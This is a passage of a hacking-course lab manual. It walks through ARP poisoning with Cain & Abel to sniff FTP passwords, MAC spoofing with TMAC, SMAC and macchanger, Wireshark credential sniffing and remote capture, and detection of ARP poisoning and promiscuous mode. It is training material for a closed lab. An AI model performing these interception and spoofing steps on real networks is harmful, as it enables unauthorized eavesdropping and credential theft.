Networks screen appears, click Yes to allow your PC to be discoverable by other PCs and devices on the network.

Screenshot

Click the Type here to search icon at the bottom of Desktop and type cain. Click Cain from the results.

Screenshot

The Cain & Abel main window appears, as shown in the screenshot.

Screenshot

Click Configure from the menu bar to configure an ethernet card.

Screenshot

The Configuration Dialog window appears. By default, the Sniffer tab is selected. Ensure that the Adapter associated with the IP address of the machine is selected; then, click OK.

Screenshot

Click the Start/Stop Sniffer icon on the toolbar to begin sniffing.

ffm1p4jy.jpg

A Cain pop-up appears and displays a Warning message; click OK.

Screenshot

Now, click the Sniffer tab.

Screenshot

Click the plus (+) icon or right-click in the window and select Scan MAC Addresses to scan the network for hosts.

The MAC Address Scanner window appears. Check the All hosts in my subnet radio button and select the All Tests checkbox; then, click OK.

Screenshot

Cain & Abel starts scanning for MAC addresses and lists all those found.

After completing the scan, a list of all active IP addresses along with their corresponding MAC addresses is displayed, as shown in the screenshot.

Screenshot

Now, click the APR tab at the bottom of the window.

APR options appear in the left-hand pane. Click anywhere on the topmost section in the right-hand pane to activate the plus (+) icon.

myf4yiu5.jpg

Click the plus (+) icon, a New ARP Poison Routing window appears, from which we can add IPs to listen to traffic.

Screenshot

To monitor the traffic between two systems (here, Windows 11 and Windows Server 2022), click to select 10.10.1.11 (Windows 11) from the left-hand pane and 10.10.1.22 (Windows Server 2022) from the right-hand pane; click OK.

Screenshot

Click to select the created target IP address scan displayed in the Configuration / Routes Packets tab.

Click on the Start/Stop APR icon to start capturing ARP packets. The Status will change from Idle to Poisoning.

2ox4forp.jpg

Screenshot

Click Windows Server 2022 to switch to the Windows Server 2022 machine, click Ctrl+Alt+Delete. By default, CEH\Administrator user profile is selected, click Pa$$w0rd to paste the password in the Password field and press Enter to login.

Screenshot

Click the Type here to search icon at the bottom of Desktop and type cmd. Click Command Prompt from the results.

Screenshot

The Command Prompt window appears; type ftp 10.10.1.11 (the IP address of Windows 11) and press Enter.

When prompted for a User, type “Jason” and press Enter; for a Password, type “qwerty” and press Enter.

Irrespective of a successful login, Cain & Abel captures the password entered during login.

Screenshot

Click Windows Server 2019 to switch back to the Windows Server 2019 machine; observe that the tool lists packet exchange.

Screenshot

Click the Passwords tab from the bottom of the window. Click FTP from the left-hand pane to view the sniffed password for ftp 10.10.1.11, as shown in the screenshot.

Screenshot

In real-time, attackers use the ARP poisoning technique to perform sniffing on the target network. Using this method, attackers can steal sensitive information, prevent network and web access, and perform DoS and MITM attacks.

This concludes the demonstration of how to perform an MITM attack using Cain & Abel.

Close all open windows and document all the acquired information.

========
Task 5: Spoof a MAC Address using TMAC and SMAC
========

Here, we will use TMAC and SMAC tools to perform MAC spoofing.

Click Windows 11 to switch to the Windows 11 machine.

If a User Account Control pop-up appears, click Yes.

Click Search icon ( search12icon.jpg) on the Desktop. Type TMAC in the search field, the TMAC v6 appears in the results, click Open to launch it.

If a User Account Control pop-up appears, click Yes.

Screenshot

The Technitium MAC Address Changer main window appears. In the Technitium MAC Address Changer pop-up, click No.

Screenshot

In the TMAC main window, choose the network adapter of the target machine, whose MAC address is to be spoofed (here, Ethernet).

Under the Information tab, note the Original MAC Address of the network adapter, as shown in the screenshot.

Screenshot

Click the Random MAC Address button under the Change MAC Address option to generate a random MAC address for the network adapter.

Screenshot

A Random MAC Address is generated and appears under the Change MAC Address field. Click the Change Now ! button to change the MAC address.

The MAC Address Changed Successfully pop-up appears; click Ok.

Screenshot

Observe that the newly generated random MAC address appears under the Active MAC Address section, as shown in the screenshot.

Screenshot

To restore the original MAC address, you can click on the Restore Original button present at the bottom of the TMAC window.

The MAC Address Restored Successfully pop-up appears; click OK.

Screenshot

Close the TMAC main window.

Now, we shall perform MAC spoofing using the SMAC tool.

Click Search icon ( search12icon.jpg) on the Desktop. Type SMAC in the search field, the SMAC 2.7 appears in the results, click Open to launch it.

If a User Account Control pop-up appears, click Yes.

Screenshot

The SMAC main window appears, along with the SMAC License Agreement. Click I Accept to continue.

Screenshot

The SMAC Registration window appears; click Proceed to continue with the unregistered version of SMAC.

Screenshot

The SMAC main window appears. Choose the network adapter of the target machine whose MAC address is to be spoofed.

Screenshot

Click the Random button to generate a random MAC address.

Screenshot

A randomly generated MAC appears in the New Spoofed MAC Address field, as shown in the screenshot.

Screenshot

Click the forward arrow button (>>) under Network Connection to view the Network Adapter information.

adwcgpw4.jpg

Clicking the back arrow (<<) button under Network Adapter will again display the Network Connection information. These buttons allow toggling between the network connection and network adapter.

Screenshot

Similarly, you can click the forward arrow button (>>) under Hardware ID to view Configuration ID information and click the back arrow button (<<) to toggle back to Hardware ID information.

bbq4pq4c.jpg

Click the IPConfig button to view the ipconfig information.

Screenshot

The View IPConfig window appears and displays the IP configuration details of the available network adapters. Click Close after analyzing the information.

Screenshot

Click the MAC List button to import the MAC address list into SMAC.

Screenshot

The MAC List window appears; click the Load List button.

Screenshot

The Load MAC List window appears; select the Sample_MAC_Address_List.txt file and click Open.

Screenshot

A list of MAC addresses will be added to the MAC List in SMAC. Choose any MAC Address and click the Select button.

Screenshot

The selected MAC address appears under the New Spoofed MAC Address field.

Screenshot

Click the Update MAC button to update the machine’s MAC address information.

Screenshot

The SMAC pop-up appears; click Yes. It will cause a temporary disconnection in your network adapter.

This dialog box only appears in the evaluation or trial version.

In evaluation mode, you can change the MAC address to 0C-0C-0C-0C-0C-01. If you purchase SMAC, you can change the MAC address as you like.

Screenshot

After successfully spoofing the MAC address, a SMAC pop-up appears, stating “Adapter Restart Complete”; click OK.

Screenshot

Once the adapter is restarted, a random MAC address is assigned to your machine. You can see the newly generated MAC address under Spoofed MAC Address and Active MAC Address.

Screenshot

By spoofing the MAC address, an attacker can simulate attacks such as ARP poisoning and MAC flooding without revealing their own actual MAC address.

To restore the MAC address back to its original setting, click the Remove MAC button.

This concludes the demonstration of spoofing MAC addresses using TMAC and SMAC.

Close all open windows and document all the acquired information.

========
Task 6: Spoof a MAC Address of Linux Machine using macchanger
========

Here, we will be using macchanger utility to change the MAC address of a Linux system

Click Parrot Security to switch to the Parrot Security machine.

Screenshot

In the login page, the attacker username will be selected by default. Enter password as toor in the Password field and press Enter to log in to the machine.

If a Parrot Updater pop-up appears at the top-right corner of Desktop, ignore and close it.

If a Question pop-up window appears asking you to update the machine, click No to close the window.

Screenshot

Click the MATE Terminal icon at the top of the Desktop window to open a Terminal window.

Screenshot

A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

Now, type cd and press Enter to jump to the root directory.

Screenshot

Before changing the MAC address we need to turn off the network interface.

Type ifconfig eth0 down and press Enter, to turn off the network interface.

Screenshot

Type macchanger --help command to see the available options of macchanger tool.

Screenshot

To see the current MAC address of the Parrot Security machine, type macchanger -s eth0 and press Enter.

-s: prints the MAC address of the machine.

Screenshot

Now we will change the MAC address of the network interface.

In the terminal type, macchanger -a eth0 and press Enter, to set a random vendor MAC address to the network interface.

-a: sets random vendor MAC address to the network interface.

Screenshot

Now, type macchanger -r eth0 and press Enter, to set a random MAC address to the network interface.

Screenshot

To enable the network interface type ifconfig eth0 up and press Enter.

To check the changed MAC address, type ifconfig and press Enter.

Screenshot

You can observe that a random MAC address is set to the network interface.

This concludes the demonstration of how to spoof a MAC address of Linux machine using macchanger

Close all open windows and document all the acquired information.

Now, before proceeding to the next task, End the lab and re-launch it to reset the machines. To do so, click the Menu icon ( menu2.jpg) and click END from the drop-down options.


########
Lab 2: Perform Network Sniffing using Various Sniffing Tools
########

========
Task 1: Perform Password Sniffing using Wireshark
========

Here, we will use the Wireshark tool to perform password sniffing.

In this task, we will use the Windows Server 2019 (10.10.1.19) machine as the host machine and the Windows 11 (10.10.1.11) machine as the target machine.

Click Windows Server 2019 to switch to the Windows Server 2019 machine.

Click Ctrl+Alt+Delete to activate the machine. By default, Administrator user profile is selected, click Pa$$w0rd to paste the password in the Password field and press Enter to login.

Click the Type here to search icon at the bottom of Desktop and type wireshark. Click Wireshark from the results.

If the Software update window appears, click Remind me later.

Screenshot

The Wireshark Network Analyzer window appears; double-click the available ethernet or interface (here, Ethernet2) to start the packet capture, as shown in the screenshot.

Screenshot

Wireshark starts capturing all packets generated while traffic is received by or sent from your machine.

Screenshot

Now, click Windows 11 to switch to the Windows 11 machine, click Ctrl+Alt+Delete.

By default, Admin user profile is selected, click Pa$$w0rd to paste the password in the Password field and press Enter to login.

Alternatively, you can also click Pa$$w0rd under Windows 11 machine thumbnail in the Resources pane or Click Type Text | Type Password button under Commands (thunder icon) menu.

If Welcome to Windows wizard appears, click Continue and in Sign in with Microsoft wizard, click Cancel.

Networks screen appears, click Yes to allow your PC to be discoverable by other PCs and devices on the network.

Screenshot

Open any browser (here, Mozilla Firefox), Place the cursor in the address bar and click on http://www.moviescope.com/ in the address bar, and press Enter.

The MOVIESCOPE home page appears; type Username and Password as sam and test, and click Login, as shown in the screenshot.

Screenshot

Click Windows Server 2019 to switch back to Windows Server 2019 machine, and in the Wireshark window, click the Stop capturing packets icon on the toolbar.

Screenshot

Click File --> Save As… from the top-left corner of the window to save the captured packets.

Screenshot

The Wireshark: Save file as window appears. Select any location to save the file, specify File name as Password Sniffing, and click Save.

Screenshot

In the Apply a display filter field, type http.request.method == POST and click the arrow icon (-->) to apply the filter.

Applying this syntax helps you narrow down the search for http POST traffic.

Screenshot

Wireshark only filters http POST traffic packets, as shown in the screenshot.

Screenshot

Now, click Edit from the menu bar and click Find Packet….

Screenshot

The Find Packet section appears below the display filter field.

Click Display filter, select String from the drop-down options. Click Packet list, select Packet details from the drop-down options, and click Narrow & Wide and select Narrow (UTF-8 / ASCII) from the drop-down options.

In the field next to String, type pwd and click the Find button.

kgut0frf.jpg

Wireshark will now display the sniffed password from the captured packets.

Expand the HTML Form URL Encoded: application/x-www-form-urlencoded node from the packet details section, and view the captured username and password, as shown in the screenshot.

23xaiz44.jpg

Close the Wireshark window.

Click Windows 11 to switch to the Windows 11 machine, close the web browser, and sign out from the Admin account.

Screenshot

Click Windows Server 2019 to switch back to the Windows Server 2019 machine.

Click the Type here to search icon at the bottom of Desktop and type Remote. Click Remote Desktop Connection from the results.

Screenshot

The Remote Desktop Connection dialog-box appears; click Show Options.

If some previously accessed IP address appears in the Computer field, delete it.

Screenshot

The dialog-box expands; under the General tab, type 10.10.1.11 in the Computer field and Jason in the User name field; click Connect.

The IP address and username might differ in your lab environment. The target system credentials (Jason and qwerty) we are using here are obtained in the previous labs.

Screenshot

The Windows Security pop-up appears. Enter Password (qwerty) and click OK.

If Remember me option is checked uncheck it.

Screenshot

The Remote Desktop Connection pop-up appears; click Yes.

Screenshot

A remote connection to the target system (Windows 11) appears, as shown in the screenshot.

If a Choose privacy settings for your device window appears, click on Next in the next window click on Next and in the next window click on Accept.

Screenshot

Click Search icon ( search13icon.jpg) on the Desktop. Type Control in the search field, the Control Panel appears in the results, click Open to launch it.

Screenshot

The Control Panel window appears; navigate to System and Security --> Windows Tools. In the Windows Tools control panel, double-click Services.

Screenshot

The Services window appears. Choose Remote Packet Capture Protocol v.0 (experimental), right-click the service, and click Start.

Screenshot

The Status of the Remote Packet Capture Protocol v.0 (experimental) service will change to Running, as shown in the screenshot.

Screenshot

Close all open windows on the Windows 11 machine and close Remote Desktop Connection.

If a Remote Desktop Connection pop-up appears, click OK.

Now, in Windows Server 2019, click the Type here to search icon at the bottom of Desktop and type wireshark. Click Wireshark from the results, to launch Wireshark.

Screenshot

The Wireshark Network Analyzer window appears; click the Capture options icon from the toolbar.

Screenshot

The Wireshark. Capture Options window appears; click the Manage Interfaces… button.

Screenshot

The Manage Interfaces window appears; click the Remote Interfaces tab, and then the Add a remote host and its interface icon (+).

Screenshot

The Remote Interface window appears. In the Host text field, enter the IP address of the target machine (here, 10.10.1.11); and in the Port field, enter the port number as 2002.

Under the Authentication section, select the Password authentication radio button and enter the target machine’s user credentials (here, Jason and qwerty); click OK.

The IP address and user credentials may differ when you perform this task.

Screenshot

A new remote interface is added to the Manage Interfaces window; click OK.

Screenshot

The newly added remote interface appears in the Wireshark. Capture Options window; click Start.

Screenshot

Click Windows 11 to switch to the Windows 11 machine, click Ctrl+Alt+Delete. Select Jason from the list of user accounts in the left-pane, click qwerty to enter the password and press Enter to log in. Here, you are signing in as the victim.

Screenshot

Acting as the target, open any web browser (here, Mozilla Firefox) and browse the website of your choice (here, http://www.goodshopping.com).

Although we are only browsing the Internet here, you could also log in to your account and sniff the credentials.

Screenshot

Click Windows Server 2019 to switch back to the Windows Server 2019 machine. Wireshark starts capturing packets as soon as the user (here, you) begins browsing the Internet, the shown in the screenshot.

Screenshot

After a while, click the Stop capturing packet icon on the toolbar to stop live packet capture.

This way, you can use Wireshark to capture traffic on a remote interface.

In real-time, when attackers gain the credentials of a victim’s machine, they attempt to capture its remote interface and monitor the traffic its user browses to reveal confidential user information.

This concludes the demonstration of how to perform password sniffing using Wireshark.

Close all open windows and document all the acquired information.

========
Task 2: Analyze a Network using the Omnipeek Network Protocol Analyzer
========

An ethical hacker or pen tester can use this tool to monitor and analyze network traffic of the target network in real-time, identify the source location of that traffic, and attempt to obtain sensitive information as well as find any network loopholes.

Before starting this lab, we need to find the User IDs associated with the usernames for the Windows 11 machine.

Click Windows 11 to switch to the Windows 11 machine.

Open any browser (here, Mozilla Firefox), Place the cursor in the address bar and click on https://www.liveaction.com/products/omnipeek-network-protocol-analyzer/ in the address bar, and press Enter.

If a website cookie notification appears, click Accept.

The LiveAction website appears; click the Free Trial button.

If Warning: Potential Security Risk Ahead page appears, click Advanced, and click Accept the Risk and Continue.

You will be redirected to a cart in live action, click checkout.

Screenshot

The LiveAction Store website appears. Input your personal details in all required fields. Click the Start My Omnipeek Trial button.

Here, you must provide your professional EMAIL ADDRESS (work or school accounts).

m5vgilqy.jpg

fqra2kim.jpg

The Let's get started webpage appears, displaying the License Key and download link for Omnipeek. Click on the Download Omnipeek for Windows button to begin the download.

o0sndswq.jpg

If Opening Omnipeek_21.4.1msi pop-up appears; click Save File to download the application.

On completion of the download, navigate to the download location of the tool (here, Downloads) and double-click Omnipeek_21.4.1msi.

The version of Omnipeek might differ when you perform the task.

Screenshot

If an Open File - Security Warning pop-up appears, click Run.

The OmniPeek Installer wizard appears; click Next.

Screenshot

In the Product Activation wizard, ensure that the Automatic: requires an Internet connection radio-button is selected and click Next.

Screenshot

The Customer Information wizard appears; type a Company Name (here, abc) and Email (provided at the time of registration). For the serial number field, switch to the Mozilla Firefox browser and copy the License Key. Close the browser.

Switch back to the Ompnipeek Installer window, paste the License Key in the Serial Number or Product Key field, and then click Next.

205sgq4e.jpg

Follow the wizard-driven installation steps to install Omnipeek using the default settings.

While Installing LiveAction Omnipeek, if a User Account Control pop-up appears, click Yes.

On completion of the installation, the Omnipeek Installer Completed wizard appears; uncheck View Readme, ensure that the Launch Omnipeek option is checked, and click Finish.

If a User Account Control pop-up appears, click Yes.

Screenshot

The Omnipeek evaluation dialog-box appears; click OK.

The Omnipeek main window appears, as shown in the screenshot.

Screenshot

Click on the New Capture option from the Omnipeek’s main screen to create an Omnipeek capture window.

Screenshot

The Capture Options window appears; by default, the Adapter option opens-up.

Under the Adapter section in the right-hand pane, expand the Local machine: WINDOWS11 node, select Ethernet, and click OK.

Screenshot

The Capture 1 tab appears; click the Start Capture button in the right-hand corner of the window to begin capturing packets.

Screenshot

The Start Capture button changes to read “Stop Capture” and traffic statistics begin to populate Network under the Dashboards section, as shown in the screenshot.

Screenshot

Click Windows Server 2019 to switch to the Windows Server 2019 machine.

Acting as the target, open any web browser (here, Mozilla Firefox) and browse the website of your choice (here, https://www.gmail.com).

Social networking websites are blocked from this environment due to some security reasons. However, if you want to run this lab task you can use some other website of your choice or else you can run this task in your local environment.

Screenshot

Now, click Windows 11 to switch back to the Windows 11 machine. The captured statistical analysis of the data is displayed in the Capture 1 tab of the navigation bar.

You can observe the network traffic along with the websites visited by the target machine.

Screenshot

To view the captured packets, select Packets under the Capture section in the left-hand pane. You can observe the outgoing and incoming network packets of the target system.

Screenshot

You can further click the Show Decode View and Show Hex View icons to view detailed information regarding any selected packet.

b00j5j0w.jpg

Click Events under the Capture section in the left-hand pane to view the events occurring in the network.

Screenshot

Click Clients/Servers under the Expert section in the left-hand pane to view a list of active systems in the local network.

Screenshot

Similarly, under the Flows and Applications options, you can view the packet flow and applications running on the systems in the local network.

Click on Clients under the Web section in the left-hand pane to view the active systems in the network.

Click Peer Map under the Visuals section in the left-hand pane to show a mapped view of the network traffic. By default, all Traffic Types (Unicast, Multicast, and Broadcast) are selected.

You can select any traffic according to your purpose.

Screenshot

Similarly, under the Visuals section, you can click the Graphs option to show graphs on packet size, QoS analysis, TCP analysis, TCP vs. UDP, and web protocols.

Screenshot

Click on the Summary option under the Statistics section in the left-hand pane to view a summary report of the network analysis.

Screenshot

Stop the packet capturing by clicking on the Stop Capture button in the right-hand corner of the window. The Stop Capture button will toggle back to the Start Capture button.

Click File from the menu bar and click Save Report… to save the report.

Screenshot

The Save Report window appears; under the Report folder field, click the ellipse icon to change the download location.

Screenshot

The Browse For Folder window appears; select the Desktop as your save location and click OK.

The changed save location appears in the Report folder field; click the Save button to save the report.

Screenshot

The saved report automatically appears, as shown in the screenshot.

If How do you want to open this file? pop-up appears, select Firefox abd click on OK

Screenshot

Scroll down the page in the pdf to view the complete report.

Screenshot

In real-time, an attacker may perform this analysis to obtain sensitive information as well as to find any loopholes in the network.

This concludes the demonstration of analyzing a network using the Omnipeek Network Protocol Analyzer.

Close all open windows and document all the acquired information.

========
Task 3: Analyze a Network using the SteelCentral Packet Analyzer
========

Here, we will use the SteelCentral Packet Analyzer tool to analyze a network.

Click Windows 11 to switch to the Windows 11 machine, open any web browser (here, Mozilla Firefox) now type https://www.riverbed.com/trial-downloads in the address bar; press Enter.

The riverbed website appears, displaying TRIAL DOWNLOADS. Scroll down and click on LEARN MORE under Try Alluvio AppResponse/Packet Analyzer Plus Trial.

The tool version might differ in your lab environment.

At the bottom of the page click on Accept All Cookies.

amvb2gdf.jpg

A website appears with a registration form. Fill in your required personal details to create an account and click the SUBMIT button.

Here, you must give your work email to create an account.

ggdrc0sb.jpg

If a Please verify your email address pop-up appears; click CONFIRM to submit the entered email address.

A Thank You webpage appears with information regarding the trial version.

zltdiqsj.jpg

Open a new tab and log in to the email account you provided during registration. Open the email from Riverbed Evaluation License Request for SteelCentral PacketAnalyzer Plus, and click the Software link to download SteelCentral Packet Analyzer.

1yiicbqzt12.jpg

The Opening PacketAnalyzer_11.13.0_Setup.exe pop-up appears; click Save File to download the SteelCentral Packet Analyzer setup file.

e52mbuia1.jpg

On completion of the download, minimize the browser. Navigate to the download location (here, Downloads) and double-click PacketAnalyzer_11.13.0_Setup.exe.

Screenshot

The Open File - Security Warning window appears; click Run.

The SteelCentral Packet Analyzer Plus Setup window appears; click Create shortcut on desktop checkbox and click I Agree to proceed.

Screenshot

SteelCentral Packet Analyzer starts installing, and after the completion of the installation, the Completed the SteelCentral Packet Analyzer Plus Setup wizard appears. Ensure that the Start the application checkbox is selected and click Close.

Screenshot

The License window appears. Leave this window running.

Screenshot

Switch to your browser (here, Mozilla Firefox). Navigate to the tab where the Riverbed Evaluation License Request for SteelCentral PacketAnalyzer Plus email is open and copy the License Key provided in the email.

license%202.0.jpg

Switch back to License window and paste the License Key in the Product Key field. Click the Activate button.

If a User Account Control pop-up appears, click Yes.

5lsrspbq.jpg

The SteelCentral Packet Analyzer Plus license activated notification appears; click the Start button to start the application.

co0qkyjl.jpg

The SteelCentral Packet Analyzer Plus main window appears, displaying the Getting Started tab options, as shown in the screenshot.

Screenshot

Observe that under the Devices tab in the left-hand pane, the application is unable to detect any Local System as it requires admin privileges. Therefore, double-click Live Devices unavailable: Insufficient privileges to run the application as an Administrator.

Screenshot

A User Account Control pop-up appears; click Yes.

Ethernet adapter appear under Local System in the left-hand pane. Click the Microsoft Corporation adapter.

Screenshot

Double-click the Bandwidth Over Time option under the Recently Used node in the left-hand pane under the Views section.

A new Bandwidth Over Time tab appears, and SteelCentral Packet Analyzer Plus starts capturing the network traffic, as shown in the screenshot.

Screenshot

Now, click Windows Server 2019 to switch to the Windows Server 2019 machine.

Acting as the target, open any web browser (here, Mozilla Firefox) and browse the website of your choice (here, www.gmail.com).

Screenshot

Click Windows 11 to switch back to the Windows 11 machine and observe the network traffic captured by SteelCentral Packet Analyzer, as shown in the screenshot.

Screenshot

Double-click the Network Usage by Port Name option under the Recently Used node in the left-hand pane under the Views section.

A new Network Usage by Port Name tab appears, and SteelCentral Packet Analyzer Plus displays the captured network traffic.

Screenshot

Double-click the IP Conversations option under the Recently Used node in the left-hand pane under the Views section.

A new IP Conversations tab appears, displaying conversations between different IP addresses in a map view.

Screenshot

Double-click the Protocol Distribution option under the Recently Used node in the left-hand pane under the Views section.

A new Protocol Distribution tab appears, displaying Network Protocols, Transport Protocols, TCP Protocols, UDP Protocols, and other information, as shown in the screenshot.

Screenshot

Now, expand the Generic node and double-click the Capture Summary option in the left-hand pane.

A new Capture Summary tab appears, displaying information about the captured network traffic packets.

Screenshot

Expand the LAN and Network node and double-click the MAC Overview option in the left-hand pane.

A new MAC Overview tab appears, displaying information about MAC sources and destinations and MAC conversations.

Screenshot

Similarly, you can explore various options in other nodes such as VLAN, MPLS, ARP, ICMP, and DHCP.

Click Reporting from the menu bar. Click on the All Views option to generate a report that includes all views.

Screenshot

An Export Report pop-up appears, and the report starts exporting.

Screenshot

After completing the extraction, the generated report appears, as shown in the screenshot.

If a How do you want to open this file? pop up appears, click on Google Chrome and press OK

Screenshot

Scroll down to view detailed information on each option shown in Table of Contents.

Screenshot

Screenshot

This concludes the demonstration of analyzing a network using SteelCentral Packet Analyzer.

Close all open windows and document all the acquired information.

########
Lab 3: Detect Network Sniffing
########

========
Task 1: Detect ARP Poisoning and Promiscuous Mode in a Switch-Based Network
========

Here, we will detect ARP poisoning in a switch-based network using Wireshark and we will use the Nmap Scripting Engine (NSE) to check if a system on a local Ethernet has its network card in promiscuous mode.

In this task, we will use the Windows Server 2019 machine as the host machine to perform ARP poisoning, and will sniff traffic flowing between the Windows 11 and Parrot Security machines. We will use the same machine (Windows Server 2019) to detect ARP poisoning and use the Windows 11 machine to detect promiscuous mode in the network.

Click Windows Server 2019 to switch to the Windows Server 2019 machine.

Click the Type here to search icon at the bottom of Desktop and type cain. Click Cain from the results.

Screenshot

The Cain & Abel main window appears, as shown in the screenshot.

Screenshot

Click Configure from the menu bar to configure an ethernet card.

Screenshot

The Configuration Dialog window appears. The Sniffer tab is selected by default. Ensure that the Adapter associated with the IP address of the machine is selected and click OK.

Screenshot

Click the Start/Stop Sniffer icon on the toolbar to begin sniffing.

ffdc5sci.jpg

The Cain pop-up appears with a Warning message, click OK.

Screenshot

Now, click the Sniffer tab.

Screenshot

Click the plus (+) icon or right-click in the window and select Scan MAC Addresses to scan the network for hosts.

The MAC Address Scanner window appears. Check the Range radio button and specify the IP address range as 10.10.1.1-10.10.1.30. Select the All Tests checkbox; then, click OK.

Screenshot

Cain & Abel starts scanning for MAC addresses and lists all those found.

After the completion of the scan, a list of all active IP addresses along with their corresponding MAC addresses is displayed, as shown in the screenshot.

Screenshot

Now, click the APR tab at the bottom of the window.

APR options appear in the left-hand pane. Click anywhere on the topmost section in the right-hand pane to activate the plus (+) icon.

fobfk1bb.jpg

Click the plus (+) icon; a New ARP Poison Routing window appears; from which we can add IPs to listen to traffic.

Screenshot

To monitor the traffic between two systems (here, Windows 11 and Parrot Security), from the left-hand pane, click to select 10.10.1.11 (Windows 11) and from the right-hand pane, click 10.10.1.13 (Parrot Security); click OK. By doing so, you are setting Cain to perform ARP poisoning between the first and second targets.

wqfe3j1i.jpg

Click to select the created target IP address scan that is displayed in the Configuration / Routed Packets tab.

Click on the Start/Stop APR icon to start capturing ARP packets.

5pqwulc4.jpg

After clicking on the Start/Stop APR icon, Cain & Abel starts ARP poisoning and the status of the scan changes to Poisoning, as shown in the screenshot.

Screenshot

Cain & Abel intercepts the traffic traversing between these two machines.

To generate traffic between the machines, you need to ping one target machine using the other.

Click Parrot Security to switch to the Parrot Security machine.

Click the MATE Terminal icon at the top of the Desktop window to open a Terminal window.

Screenshot

A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

Now, type cd and press Enter to jump to the root directory.

Screenshot

A Parrot Terminal window appears; type hping3 [Target IP Address] -c 100000 (here, target IP address is 10.10.1.11 [Windows 11]) and press Enter.

-c: specifies the packet count.

This command will start pinging the target machine (Windows 11) with 100,000 packets.

Screenshot

Leave the command running and immediately click Windows Server 2019 to switch to the Windows Server 2019 machine.

Click the Type here to search icon at the bottom of Desktop and type wireshark. Click Wireshark from the results.

Screenshot

The Wireshark Network Analyzer window appears; click Edit in the menu bar and select Preferences….

Screenshot

The Wireshark . Preferences window appears; expand the Protocols node.

Screenshot

Scroll-down in the Protocols node and select the ARP/RARP option.

From the right-hand pane, click the Detect ARP request storms checkbox and ensure that the Detect duplicate IP address configuration checkbox is checked; click OK.

Screenshot

Now, double-click on the adapter associated with your network (here, Ethernet2) to start capturing the network packets.

Screenshot

Wireshark begins to capture the traffic between the two machines, as shown in the screenshot.

Screenshot

Switch to the Cain & Abel window to observe the packets flowing between the two machines.

Screenshot

Now, switch to Wireshark and click the Stop packet capturing icon to stop the packet capturing.

Screenshot

Click Analyze from the menu bar and select Expert Information from the drop-down options.

Screenshot

The Wireshark . Expert Information window appears; click to expand the Warning node labeled Duplicate IP address configured (10.10.1.11), running on the ARP/RARP protocol.

Screenshot

Arrange the Wireshark . Expert Information window above the Wireshark window so that you can view the packet number and the Packet details section.

In the Wireshark . Expert Information window, click any packet (here, 138).

bk1embik.jpg

On selecting the packet number, Wireshark highlights the packet, and its associated information is displayed under the packet details section. Close the Wireshark . Expert Information window.

The warnings highlighted in yellow indicate that duplicate IP addresses have been detected at one MAC address, as shown in the screenshot.

Screenshot

ARP spoofing succeeds by changing the IP address of the attacker’s computer to the IP address of the target computer. A forged ARP request and reply packet find a place in the target ARP cache in this process. As the ARP reply has been forged, the destination computer (target) sends frames to the attacker’s computer, where the attacker can modify the frames before sending them to the source machine (User A) in an MITM attack. At this point, the attacker can launch a DoS attack by associating a non-existent MAC address with the IP address of the gateway or may passively sniff the traffic, and then forward it to the target destination.

This concludes the demonstration of detecting ARP poisoning in a switch-based network.

Close the Wireshark window and leave all other windows running.

Now, we shall perform promiscuous mode detection using Nmap.

Now, Click Windows 11 to switch to the Windows 11 machine. Click Search icon ( search14icon.jpg) on the Desktop. Type zenmap in the search field, the Nmap - Zenmap GUI appears in the results, click Open to launch it.

MicrosoftTeams-image.png

The Zenmap window appears. In the Command field, type the command nmap --script=sniffer-detect [Target IP Address/ IP Address Range] (here, target IP address is 10.10.1.19 [Windows Server 2019]) and click Scan.

The scan results appear, displaying Likely in promiscuous mode under the Host script results section. This indicates that the target system is in promiscuous mode.

3t2lwkad.jpg

Close the Nmap tool window and document all the acquired information.

Close all open windows in all machines (ensure that ARP poisoning is not running in Windows Server 2019), and document all the acquired information.

========
Task 2: Detect ARP Poisoning using the Capsa Network Analyzer
========

Capsa Network Analyzer

Capsa, a portable network performance analysis and diagnostics tool, provides packet capture and analysis capabilities with an easy to use interface that allows users to protect and monitor networks in a critical business environment. It helps ethical hackers or pentesters in quickly detecting ARP poisoning and ARP flooding attack and in locating attack source.

Habu

Habu is an open source penetration testing toolkit that can perform various tasks such as ARP poisoning, ARP sniffing, DHCP starvation and DHCP discovers.

Here, we will use Habu tool to perform ARP poisoning attack on the target system and use Capsa Network Analyser to detect the attack.

Click Windows 11 to switch to the Windows 11 machine.

1.jpg

Open any browser (here, Mozilla Firefox), Place the cursor in the address bar, type https://www.colasoft.com/download/arp_flood_arp_spoofing_arp_poisoning_attack_solution_with_capsa.php in the address bar, and press Enter.

2.jpg

In the Colasoft Capsa - Quick detect ARP poisoning & ARP flooding window, click on Download Free Trial button.

3.jpg

You will be redirected to Download Capsa Enterprise Trial window, scroll-down and fill all the required personal details and click on 30-Day Trial Download.

Here, you must provide your professional EMAIL ADDRESS (work or school accounts).

4.jpg 5.jpg

You will be redirected to download page, if Opening capsa_ent_15.1.0.15104_x64.zip pop-up appears select Save File radio button and click on OK.

6.jpg

The capsa_ent_15.1.0.15104_x64.zip file starts downloading, it will take approximately 5 minutes for the download.

Once the download completes, navigate to the Downloads folder and right-click on capsa_ent_15.1.0.15104_x64.zip file and hover the cursor over WinRAR and select Extract Here option from the list.

7j.jpg

Once the extraction is completed, double-click the capsa_ent_15.1.0.15104_x64.exe file.

8.jpg

A User Account Control pop-up appears; click Yes.

9.jpg

Setup - Colasoft Capsa Enterprise window appears, click Next and follow the wizard driven steps to install Colasoft Capsa Enterprise tool.

10.jpg

In the Completing the Colasoft Capsa Enterprise Setup Wizard, ensure that Launch Program checkbox is checked and click on Finish.

11.jpg

In the Colasoft Software Activation Wizard - Colasoft Capsa Enterprise Edition window, click Next.

12.jpg

In the next window we need to enter the serial number to activate the license.

Leave the Colasoft Software Activation Wizard - Colasoft Capsa Enterprise Edition as it is and switch to the browser.

Open a new tab in the browser and log in to the email account you provided during registration. Open the email from service@colasoft.com and copy the Trial Serial Number as shown in the screenshot.

qra.jpg

Now, minimize the browser window and switch to the Colasoft Software Activation Wizard - Colasoft Capsa Enterprise Edition window and paste the copied serial number in the Serial Number field. Ensure that Activate online (Recommended) radio button is selected and click on Next.

13.png

A Colasoft Software Activation Wizard - Colasoft Capsa Enterprise Edition window appears, showing that the software has been successfully activated, click on Finish.

14.jpg

After successful installation, A Analysis Project 1 - Colasoft Capsa Enterprise Trial window appears.

15.jpg

